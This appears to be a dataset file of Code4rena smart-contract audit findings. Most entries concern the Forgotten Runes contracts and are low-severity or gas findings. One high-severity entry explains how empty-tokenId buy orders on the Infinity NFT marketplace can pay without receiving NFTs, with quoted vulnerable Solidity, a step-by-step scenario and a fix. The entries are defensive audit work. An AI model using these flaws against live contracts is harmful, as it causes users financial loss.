        "ERC1155"
      ],
      "finders": [
        "unforgiven"
      ]
    },
    {
      "id": "2767",
      "title": "[H-01] Maker buy order with no specified NFT tokenIds may get fulfilled in `matchOneToManyOrders` without receiving any NFT",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug, also found by 0xsanson, PwnedNoMore, and unforgiven_\n\nThe call stack: matchOneToManyOrders() -> \\_matchOneMakerSellToManyMakerBuys() -> \\_execMatchOneMakerSellToManyMakerBuys() -> \\_execMatchOneToManyOrders() -> \\_transferMultipleNFTs()\n\nBased on the context, a maker buy order can set `OrderItem.tokens` as an empty array to indicate that they can accept any tokenId in this collection, in that case, `InfinityOrderBookComplication.doTokenIdsIntersect()` will always return `true`.\n\nHowever, when the system matching a sell order with many buy orders, the `InfinityOrderBookComplication` contract only ensures that the specified tokenIds intersect with the sell order, and the total count of specified tokenIds equals the sell order's quantity (`makerOrder.constraints[0]`).\n\nThis allows any maker buy order with same collection and `empty tokenIds` to be added to `manyMakerOrders` as long as there is another maker buy order with specified tokenIds that matched the sell order's tokenIds.\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L68-L116>\n\n```solidity\nfunction canExecMatchOneToMany(\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.MakerOrder[] calldata manyMakerOrders\n  ) external view override returns (bool) {\n    uint256 numItems;\n    bool isOrdersTimeValid = true;\n    bool itemsIntersect = true;\n    uint256 ordersLength = manyMakerOrders.length;\n    for (uint256 i = 0; i < ordersLength; ) {\n      if (!isOrdersTimeValid || !itemsIntersect) {\n        return false; // short circuit\n      }\n\n      uint256 nftsLength = manyMakerOrders[i].nfts.length;\n      for (uint256 j = 0; j < nftsLength; ) {\n        numItems += manyMakerOrders[i].nfts[j].tokens.length;\n        unchecked {\n          ++j;\n        }\n      }\n\n      isOrdersTimeValid =\n        isOrdersTimeValid &&\n        manyMakerOrders[i].constraints[3] <= block.timestamp &&\n        manyMakerOrders[i].constraints[4] >= block.timestamp;\n\n      itemsIntersect = itemsIntersect && doItemsIntersect(makerOrder.nfts, manyMakerOrders[i].nfts);\n\n      unchecked {\n        ++i;\n      }\n    }\n\n    bool _isTimeValid = isOrdersTimeValid &&\n      makerOrder.constraints[3] <= block.timestamp &&\n      makerOrder.constraints[4] >= block.timestamp;\n\n    uint256 currentMakerOrderPrice = _getCurrentPrice(makerOrder);\n    uint256 sumCurrentOrderPrices = _sumCurrentPrices(manyMakerOrders);\n\n    bool _isPriceValid = false;\n    if (makerOrder.isSellOrder) {\n      _isPriceValid = sumCurrentOrderPrices >= currentMakerOrderPrice;\n    } else {\n      _isPriceValid = sumCurrentOrderPrices <= currentMakerOrderPrice;\n    }\n\n    return (numItems == makerOrder.constraints[0]) && _isTimeValid && itemsIntersect && _isPriceValid;\n  }\n```\n\nHowever, because `buy.nfts` is used as `OrderItem` to transfer the nfts from seller to buyer, and there are no tokenIds specified in the matched maker buy order, the buyer wont receive any nft (`_transferERC721s` does nothing, 0 transfers) despite the buyer paid full in price.\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L763-L786>\n\n```solidity\nfunction _execMatchOneMakerSellToManyMakerBuys(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    isUserOrderNonceExecutedOrCancelled[buy.signer][buy.constraints[5]] = true;\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice - protocolFee;\n    _execMatchOneToManyOrders(sell.signer, buy.signer, buy.nfts, buy.execParams[1], remainingAmount);\n    _emitMatchEvent(\n      sellOrderHash,\n      buyOrderHash,\n      sell.signer,\n      buy.signer,\n      buy.execParams[0],\n      buy.execParams[1],\n      execPrice\n    );\n```\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1080-L1092>\n\n```solidity\nfunction _transferERC721s(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    uint256 numTokens = item.tokens.length;\n    for (uint256 i = 0; i < numTokens; ) {\n      IERC721(item.collection).safeTransferFrom(from, to, item.tokens[i].tokenId);\n      unchecked {\n        ++i;\n      }\n    }\n  }\n```\n\n### Proof of Concept\n\n1.  Alice signed and submitted a maker buy order #1, to buy `2` Punk with `2 WETH` and specified tokenIds = `1`,`2`\n2.  Bob signed and submitted a maker buy order #2, to buy `1` Punk with `1 WETH` and with no specified tokenIds.\n3.  Charlie signed and submitted a maker sell order #3, ask for `3 WETH` for `2` Punk and specified tokenIds = `1`,`2`\n4.  The match executor called `matchOneToManyOrders()` match Charlie's sell order #3 with buy order #1 and #2, Alice received `2` Punk, Charlie received `3 WETH`, Bob paid `1 WETH` and get nothing in return.\n\n### Recommendation\n\nChange to:\n\n```solidity\nfunction canExecMatchOneToMany(\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.MakerOrder[] calldata manyMakerOrders\n  ) external view override returns (bool) {\n    uint256 numItems;\n    uint256 numConstructedItems;\n    bool isOrdersTimeValid = true;\n    bool itemsIntersect = true;\n    uint256 ordersLength = manyMakerOrders.length;\n    for (uint256 i = 0; i < ordersLength; ) {\n      if (!isOrdersTimeValid || !itemsIntersect) {\n        return false; // short circuit\n      }\n\n      numConstructedItems += manyMakerOrders[i].constraints[0];\n\n      uint256 nftsLength = manyMakerOrders[i].nfts.length;\n      for (uint256 j = 0; j < nftsLength; ) {\n        numItems += manyMakerOrders[i].nfts[j].tokens.length;\n        unchecked {\n          ++j;\n        }\n      }\n\n      isOrdersTimeValid =\n        isOrdersTimeValid &&\n        manyMakerOrders[i].constraints[3] <= block.timestamp &&\n        manyMakerOrders[i].constraints[4] >= block.timestamp;\n\n      itemsIntersect = itemsIntersect && doItemsIntersect(makerOrder.nfts, manyMakerOrders[i].nfts);\n\n      unchecked {\n        ++i;\n      }\n    }\n\n    bool _isTimeValid = isOrdersTimeValid &&\n      makerOrder.constraints[3] <= block.timestamp &&\n      makerOrder.constraints[4] >= block.timestamp;\n\n    uint256 currentMakerOrderPrice = _getCurrentPrice(makerOrder);\n    uint256 sumCurrentOrderPrices = _sumCurrentPrices(manyMakerOrders);\n\n    bool _isPriceValid = false;\n    if (makerOrder.isSellOrder) {\n      _isPriceValid = sumCurrentOrderPrices >= currentMakerOrderPrice;\n    } else {\n      _isPriceValid = sumCurrentOrderPrices <= currentMakerOrderPrice;\n    }\n\n    return (numItems == makerOrder.constraints[0]) && (numConstructedItems == numItems) && _isTimeValid && itemsIntersect && _isPriceValid;\n  }\n```\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/254#issuecomment-1162958056):**\n> Fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/7f0e195d52165853281b971b8610b27140da6e41\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/254#issuecomment-1179552380):**\n > Confirmed the scenario as described.\n> \n> Buyers specifying just a collection and no specific tokens is a basically a floor sweep which has become common for NFTs. In this scenario, the warden shows how a buyer can end up spending money and get nothing in return. This is a High risk issue.\n> \n> Issue [#314](https://github.com/code-423n4/2022-06-infinity-findings/issues/314) is very similar but flips the impact to explore how a seller's offer could be attacked and how it applies to an allow list of tokenIds. (It has been grouped with H-01)\n\n\n\n***\n\n",
      "summary": "\nA bug report has been identified in the code for the InfinityOrderBookComplication contract. This bug can cause a buyer to pay full price for a Non-Fungible Token (NFT) but not receive the item.\n\nThe call stack for this bug is matchOneToManyOrders() -> _matchOneMakerSellToManyMakerBuys() -> _execMatchOneMakerSellToManyMakerBuys() -> _execMatchOneToManyOrders() -> _transferMultipleNFTs().\n\nThe bug occurs when a maker buy order sets OrderItem.tokens as an empty array. This indicates that the buyer can accept any tokenId in the collection. When the system is matching a sell order with many buy orders, the InfinityOrderBookComplication contract only ensures that the specified tokenIds intersect with the sell order and the total count of specified tokenIds equals the sell order's quantity (makerOrder.constraints[0]).\n\nThis allows any maker buy order with same collection and empty tokenIds to be added to manyMakerOrders as long as there is another maker buy order with specified tokenIds that matched the sell order's tokenIds. However, because buy.nfts is used as OrderItem to transfer the nfts from seller to buyer, and there are no tokenIds specified in the matched maker buy order, the buyer wont receive any nft (_transferERC721s does nothing, 0 transfers) despite the buyer paid full in price.\n\nA Proof of Concept (PoC) has been provided to demonstrate the bug. This PoC involves Alice, Bob, and Charlie. Alice signed and submitted a maker buy order #1, to buy 2 Punk with 2 WETH and specified tokenIds = 1,2. Bob signed and submitted a maker buy order #2, to buy 1 Punk with 1 WETH and with no specified tokenIds. Charlie signed and submitted a maker sell order #3, ask for 3 WETH for 2 Punk and specified tokenIds = 1,2. The match executor called matchOneToManyOrders() match Charlie's sell order #3 with buy order #1 and #2, Alice received 2 Punk, Charlie received 3 WETH, Bob paid 1 WETH and get nothing in return.\n\nThe recommendation for fixing this bug is to change the code in the canExecMatchOneToMany",
      "quality_score": 5,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/254",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "WatchPug",
        "unforgiven",
        "PwnedNoMore",
        "0xsanson"
      ]
    },
    {
      "id": "22434",
      "title": "[08] Front-running is possible over the minting process",
      "impact": "LOW",
      "content": "\nDuring the code review, it has been noticed that to bidding mechanism is vulnerable to front-running. The bidding mechanism can have EOA check on the contract. \n\n### Proof of Concept\n\n1. Navigate to the following contract.\n\n2. The contract does not check for the External Owned Accounts. Without the check, any contract can interact with the function. \n\n[ForgottenRunesWarriorsMinter.sol#L120](https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol#L120)<br>\n\n### Recommended Mitigation Steps\n\nConsider to check EOA at the beginning of the function.\n\n```\nmsg.sender == tx.origin && !isContract(msg.sender)\n```\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22433",
      "title": "[07] Use safeTransfer/safeTransferFrom consistently instead of transfer/transferFrom",
      "impact": "LOW",
      "content": "\nIt is good to add a require() statement that checks the return value of token transfers or to use something like OpenZeppelin’s safeTransfer/safeTransferFrom unless one is sure the given token reverts in case of a failure. Failure to do so will cause silent failures of transfers and affect token accounting in contract.\n\nReference: This similar medium-severity finding from Consensys Diligence Audit of Fei Protocol: https://consensys.net/diligence/audits/2021/01/fei-protocol/#unchecked-return-value-for-iweth-transfer-call\n\n### Proof of Concept\n\n1. Navigate to the following contract.\n\n2. transfer/transferFrom functions are used instead of safe transfer/transferFrom on the following contracts.\n\n[ForgottenRunesWarriorsGuild.sol#L175](https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsGuild.sol#L175)<br>\n\n### Recommended Mitigation Steps\n\nConsider using safeTransfer/safeTransferFrom or require() consistently.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22432",
      "title": "[06] Bump OZ packages to ^4.5.0.",
      "impact": "LOW",
      "content": "\nLine Reference: [package.json#L68](https://github.com/code-423n4/2022-05-runes/blob/main/package.json#L68)\n\n### Description\n\nI can verify that the installed version is 4.2.0 by executing the following commands:\n\n```\nyarn install\nyarn list @openzeppelin/contracts\n\n```\n\n### Recommended Mitigation Steps\n\nUpdate the versions of @openzeppelin/contracts and @openzeppelin/contracts-upgradeable to be the latest in package.json. I also recommend double checking the versions of other dependencies as a precaution, as they may include important bug fixes.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22431",
      "title": "[05] transferOwnership should be two step",
      "impact": "LOW",
      "content": "\nThe owner is the authorized user in the solidity contracts. Usually, an owner can be updated with transferOwnership function. However, the process is only completed with single transaction. If the address is updated incorrectly, an owner functionality will be lost forever.\n\n### Proof of Concept\n\nNavigate to the following contracts.\n\n[ForgottenRunesWarriorsMinter.sol#L15](https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol#L15)<br>\n[ForgottenRunesWarriorsGuild.sol#L14](https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsGuild.sol#L14)<br>\n\n### Recommended Mitigation Steps\n\nLack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22430",
      "title": "[04] Missing zero-address check in the setter functions and initializers",
      "impact": "LOW",
      "content": "\nMissing checks for zero-addresses may lead to infunctional protocol, if the variable addresses are updated incorrectly.\n\n### Proof of Concept\n\nNavigate to the following contracts.\n\n[ForgottenRunesWarriorsMinter.sol#L544](https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol#L544)<br>\n[ForgottenRunesWarriorsMinter.sol#L528](https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol#L528)<br>\n\n### Recommended Mitigation Steps\n\nConsider adding zero-address checks in the discussed constructors:\nrequire(newAddr != address(0));.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22429",
      "title": "[03] Pragma Version",
      "impact": "LOW",
      "content": "\nIn the contracts, floating pragmas should not be used. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.\n\n### Proof of Concept\n\nhttps://swcregistry.io/docs/SWC-103\n\n```\nAll Contracts\n```\n\n### Recommended Mitigation Steps\nLock the pragma version: delete pragma solidity 0.8.10 in favor of pragma solidity 0.8.10.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22428",
      "title": "[02] Critical changes should use two-step procedure",
      "impact": "LOW",
      "content": "\nThe critical procedures should be two step process.\n\n### Proof of Concept\n\nNavigate to the following contracts.\n\n[ForgottenRunesWarriorsMinter.sol#L441](https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol#L441)<br>\n[ForgottenRunesWarriorsMinter.sol#L448](https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol#L448)<br>\n[ForgottenRunesWarriorsMinter.sol#L455](https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol#L455)<br>\n[ForgottenRunesWarriorsMinter.sol#L462](https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol#L462)<br>\n[ForgottenRunesWarriorsMinter.sol#L469](https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol#L469)<br>\n[ForgottenRunesWarriorsMinter.sol#L480](https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol#L480)<br>\n\n### Recommended Mitigation Steps\n\nLack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22427",
      "title": "[01] Missing events for only functions that change critical parameters",
      "impact": "LOW",
      "content": "\nThe afunctions that change critical parameters should emit events. Events allow capturing the changed parameters so that off-chain tools/interfaces can register such changes with timelocks that allow users to evaluate them and consider if they would like to engage/exit based on how they perceive the changes as affecting the trustworthiness of the protocol or profitability of the implemented financial services. The alternative of directly querying on-chain contract state for such changes is not considered practical for most users/usages.\n\nMissing events and timelocks do not promote transparency and if such changes immediately affect users’ perception of fairness or trustworthiness, they could exit the protocol causing a reduction in liquidity which could negatively impact protocol TVL and reputation.\n\n### Proof of Concept\n\nNavigate to the following contracts.\n\n[ForgottenRunesWarriorsMinter.sol#L441](https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol#L441)<br>\n[ForgottenRunesWarriorsMinter.sol#L448](https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol#L448)<br>\n[ForgottenRunesWarriorsMinter.sol#L455](https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol#L455)<br>\n[ForgottenRunesWarriorsMinter.sol#L462](https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol#L462)<br>\n[ForgottenRunesWarriorsMinter.sol#L469](https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol#L469)<br>\n[ForgottenRunesWarriorsMinter.sol#L480](https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol#L480)<br>\n\nSee similar High-severity H03 finding OpenZeppelin’s Audit of Audius (https://blog.openzeppelin.com/audius-contracts-audit/#high) and Medium-severity M01 finding OpenZeppelin’s Audit of UMA Phase 4 (https://blog.openzeppelin.com/uma-audit-phase-4/)\n\n### Recommended Mitigation Steps\n\nAdd events to all functions that change critical parameters.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "5409",
      "title": "[G-10] `++i` costs less gas compared to `i++` or `i += 1`",
      "impact": "GAS",
      "content": "\n`++i` costs less gas compared to `i++` or `i += 1` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.\n\n`i++` increments `i` and returns the initial value of `i`. Which means:\n\n```solidity\nuint i = 1;  \ni++; // == 1 but i == 2  \n```\n\nBut `++i` returns the actual incremented value:\n\n```solidity\nuint i = 1;  \n++i; // == 2 and i == 2 too, so no need for a temporary variable  \n```\n\nIn the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`\n\nInstances include:\n\n```solidity\nForgottenRunesWarriorsGuild.sol:104:        numMinted += 1;\nForgottenRunesWarriorsMinter.sol:162:        for (uint256 i = 0; i < numWarriors; i++) {\nForgottenRunesWarriorsMinter.sol:193:        numSold += 1;\nForgottenRunesWarriorsMinter.sol:220:        for (uint256 i = 0; i < numWarriors; i++) {\nForgottenRunesWarriorsMinter.sol:248:        numClaimed += 1;\nForgottenRunesWarriorsMinter.sol:259:        for (uint256 i = 0; i < count; i++) {\nForgottenRunesWarriorsMinter.sol:355:        for (uint256 i = startIdx; i < endIdx + 1; i++) {\n```\n\nI suggest using `++i` instead of `i++` to increment the value of an uint variable.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "#g-10-i-costs-less-gas-compared-to-i-or-i--1",
      "tags": [],
      "finders": []
    },
    {
      "id": "5408",
      "title": "[G-08] `ForgottenRunesWarriorsMinter.currentDaPrice()`: `>` should be `>=`",
      "impact": "GAS",
      "content": "\nThe return statement is as follows:\n\n```solidity\nForgottenRunesWarriorsMinter.sol:296:        return currentPrice > lowestPrice ? currentPrice : lowestPrice;\n```\n\nStrict inequalities (`>`) are more expensive than non-strict ones (`>=`). This is due to some supplementary checks (ISZERO, 3 gas)\\\nFurthermore, `lowestPrice` is read from storage while `currentPrice` is read from memory.\n\nTherefore, it's possible to always save 3 gas and sometimes further save 1 SLOAD (when `currentPrice == lowestPrice`) by replacing the code to:\n\n```solidity\nForgottenRunesWarriorsMinter.sol:296:        return currentPrice >= lowestPrice ? currentPrice : lowestPrice;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "#g-08-forgottenruneswarriorsmintercurrentdaprice--should-be-",
      "tags": [],
      "finders": []
    },
    {
      "id": "5407",
      "title": "[G-07] `> 0` is less efficient than `!= 0` for unsigned integers (with proof)",
      "impact": "GAS",
      "content": "\n`!= 0` costs less gas compared to `> 0` for unsigned integers in `require` statements with the optimizer enabled (6 gas)\n\nProof: While it may seem that `> 0` is cheaper than `!=`, this is only true without the optimizer enabled and outside a require statement. If you enable the optimizer at 10k AND you're in a `require` statement, this will save gas. You can see this tweet for more proofs: <https://twitter.com/gzeon/status/1485428085885640706>\n\nI suggest changing `> 0` with `!= 0` here:\n\n```solidity\nForgottenRunesWarriorsMinter.sol:141:            numWarriors > 0 && numWarriors <= 20,\nForgottenRunesWarriorsMinter.sol:211:            numWarriors > 0 && numWarriors <= 20,\n```\n\nAlso, please enable the Optimizer.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "#g-07--0-is-less-efficient-than--0-for-unsigned-integers-with-proof",
      "tags": [],
      "finders": []
    },
    {
      "id": "5406",
      "title": "[G-05] `ForgottenRunesWarriorsMinter`: `bidSummon()`and `publicSummon()`: Unnecessary require statement",
      "impact": "GAS",
      "content": "\nThe code is as such:\n\n```solidity\nFile: ForgottenRunesWarriorsMinter.sol\n130:     function bidSummon(uint256 numWarriors)\n131:         external\n132:         payable\n133:         nonReentrant\n134:         whenNotPaused\n135:     {\n136:         require(numSold < maxDaSupply, 'Auction sold out');\n137:         require(numSold + numWarriors <= maxDaSupply, 'Not enough remaining');\n138:         require(daStarted(), 'Auction not started');\n139:         require(!mintlistStarted(), 'Auction phase over');\n140:         require(\n141:             numWarriors > 0 && numWarriors <= 20,\n142:             'You can summon no more than 20 Warriors at a time'\n143:         );\n...\n201:     function publicSummon(uint256 numWarriors)\n202:         external\n203:         payable\n204:         nonReentrant\n205:         whenNotPaused\n206:     {\n207:         require(numSold < maxForSale, 'Sold out');\n208:         require(numSold + numWarriors <= maxForSale, 'Not enough remaining');\n209:         require(publicStarted(), 'Public sale not started');\n210:         require(\n211:             numWarriors > 0 && numWarriors <= 20,\n212:             'You can summon no more than 20 Warriors at a time'\n213:         );\n```\n\nLogically speaking, `numSold + numWarriors <= maxForSale` could only reach the edge-case if `numWarriors == 0`, but that's prevented with the condition that follows in both functions: `numWarriors > 0 && numWarriors <= 20`.\nMeaning that, with `numSold + numWarriors <= maxForSale` and `numWarriors > 0`, we don't need to check if `numSold < maxForSale` as it just can't happen.\n\nI suggest removing the 2 `require(numSold < maxDaSupply)` checks L136 and L207.\n\nFurthermore, notice that `'Not enough remaining'` and `'Sold out'` kinda mean the same thing, so the additionnal require statement might not be justified.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "#g-05-forgottenruneswarriorsminter-bidsummonand-publicsummon-unnecessary-require-statement",
      "tags": [],
      "finders": []
    },
    {
      "id": "5405",
      "title": "[G-04] `ForgottenRunesWarriorsGuild.forwardERC20s()` and `ForgottenRunesWarriorsMinter.forwardERC20s()`: Unnecessary require statements",
      "impact": "GAS",
      "content": "\nHere, as the `onlyOwner` modifier is applied, the `address(0)` checks are not needed here:\n\n```solidity\ncontracts/ForgottenRunesWarriorsGuild.sol:\n  173      function forwardERC20s(IERC20 token, uint256 amount) public onlyOwner {\n  174:         require(address(msg.sender) != address(0)); //@audit gas: there's the onlyOwner modifier: msg.sender can't be address(0)\n  175          token.transfer(msg.sender, amount);\n  176      }\n\ncontracts/ForgottenRunesWarriorsMinter.sol:\n  627      function forwardERC20s(IERC20 token, uint256 amount) public onlyOwner {\n  628:         require(address(msg.sender) != address(0)); //@audit gas: there's the onlyOwner modifier: msg.sender can't be address(0)\n  629          token.transfer(msg.sender, amount);\n  630      }\n```\n\nI suggest removing these checks.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "#g-04-forgottenruneswarriorsguildforwarderc20s-and-forgottenruneswarriorsminterforwarderc20s-unnecessary-require-statements",
      "tags": [],
      "finders": []
    },
    {
      "id": "4613",
      "title": "[G-16] Use Custom Errors instead of Revert Strings to save Gas",
      "impact": "GAS",
      "content": "\nCustom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)\n\nSource: <https://blog.soliditylang.org/2021/04/21/custom-errors/>:\n\n> Starting from [Solidity v0.8.4](https://github.com/ethereum/solidity/releases/tag/v0.8.4), there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert(\"Insufficient funds.\");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.\n\nCustom errors are defined using the `error` statement, which can be used inside and outside of contracts (including interfaces and libraries).\n\nInstances include:\n\n```solidity\nForgottenRunesWarriorsGuild.sol:68:        require(\nForgottenRunesWarriorsGuild.sol:100:        require(numMinted < MAX_WARRIORS, 'All warriors have been summoned');\nForgottenRunesWarriorsGuild.sol:101:        require(_msgSender() == minter, 'Not a minter');\nForgottenRunesWarriorsGuild.sol:114:        require(\nForgottenRunesWarriorsGuild.sol:164:        require(payable(msg.sender).send(address(this).balance));\nForgottenRunesWarriorsGuild.sol:174:        require(address(msg.sender) != address(0));\nForgottenRunesWarriorsMinter.sol:136:        require(numSold < maxDaSupply, 'Auction sold out');\nForgottenRunesWarriorsMinter.sol:137:        require(numSold + numWarriors <= maxDaSupply, 'Not enough remaining');\nForgottenRunesWarriorsMinter.sol:138:        require(daStarted(), 'Auction not started');\nForgottenRunesWarriorsMinter.sol:139:        require(!mintlistStarted(), 'Auction phase over');\nForgottenRunesWarriorsMinter.sol:140:        require(\nForgottenRunesWarriorsMinter.sol:146:        require(\nForgottenRunesWarriorsMinter.sol:177:        require(numSold < maxForSale, 'Sold out');\nForgottenRunesWarriorsMinter.sol:178:        require(mintlistStarted(), 'Mintlist phase not started');\nForgottenRunesWarriorsMinter.sol:179:        require(msg.value == finalPrice, 'Ether value incorrect');\nForgottenRunesWarriorsMinter.sol:182:        require(mintlistMinted[msg.sender] == false, 'Already minted');\nForgottenRunesWarriorsMinter.sol:187:        require(\nForgottenRunesWarriorsMinter.sol:207:        require(numSold < maxForSale, 'Sold out');\nForgottenRunesWarriorsMinter.sol:208:        require(numSold + numWarriors <= maxForSale, 'Not enough remaining');\nForgottenRunesWarriorsMinter.sol:209:        require(publicStarted(), 'Public sale not started');\nForgottenRunesWarriorsMinter.sol:210:        require(\nForgottenRunesWarriorsMinter.sol:214:        require(\nForgottenRunesWarriorsMinter.sol:234:        require(numClaimed < maxForClaim, 'No more claims');\nForgottenRunesWarriorsMinter.sol:235:        require(claimsStarted(), 'Claim phase not started');\nForgottenRunesWarriorsMinter.sol:238:        require(claimlistMinted[msg.sender] == false, 'Already claimed');\nForgottenRunesWarriorsMinter.sol:243:        require(\nForgottenRunesWarriorsMinter.sol:258:        require(address(recipient) != address(0), 'address req');\nForgottenRunesWarriorsMinter.sol:372:        require(selfRefundsStarted(), 'Self refund period not started');\nForgottenRunesWarriorsMinter.sol:488:        require(\nForgottenRunesWarriorsMinter.sol:492:        require(\nForgottenRunesWarriorsMinter.sol:609:        require(address(vault) != address(0), 'no vault');\nForgottenRunesWarriorsMinter.sol:610:        require(payable(vault).send(_amount));\nForgottenRunesWarriorsMinter.sol:617:        require(address(vault) != address(0), 'no vault');\nForgottenRunesWarriorsMinter.sol:618:        require(payable(vault).send(address(this).balance));\nForgottenRunesWarriorsMinter.sol:628:        require(address(msg.sender) != address(0));\n```\n\nI suggest replacing revert strings with custom 